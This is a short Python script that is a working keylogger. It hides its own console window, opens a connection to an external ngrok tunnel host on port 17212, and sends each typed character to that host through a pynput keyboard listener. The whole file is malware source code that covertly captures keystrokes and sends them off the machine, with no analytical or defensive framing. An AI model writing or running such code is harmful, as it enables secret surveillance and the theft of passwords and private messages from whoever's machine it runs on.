from pwn import *
from pynput import keyboard
import win32gui
import win32con

HOST = '0.tcp.eu.ngrok.io'
PORT = 17212

hwnd = win32gui.GetForegroundWindow()
win32gui.ShowWindow(hwnd, win32con.SW_HIDE)

c = remote(HOST, PORT)

def keyPressed(key):
    try:
        char = key.char
        c.sendline(char.encode())
    except:
        pass

if __name__ == '__main__':
    listener = keyboard.Listener(on_press=keyPressed)
    listener.start()
    input()
